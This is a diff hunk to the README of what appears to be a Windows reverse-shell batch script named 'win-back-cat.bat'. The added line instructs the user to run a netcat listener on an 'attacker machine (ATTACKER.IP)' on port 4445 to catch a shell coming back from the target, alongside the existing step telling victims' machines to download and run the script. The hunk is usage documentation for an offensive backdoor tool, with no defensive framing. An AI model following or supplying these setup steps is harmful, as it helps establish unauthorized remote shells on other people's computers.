@@ -38,6 +38,7 @@
 ### Installation / How to use:
 
 - Very simple, download and execute the batch script: `win-back-cat.bat`.
+- Run a netcat listener on attacker machine (ATTACKER.IP) to get a shell back. Example: `netcat -lvp 4445`
 
 <br />
 
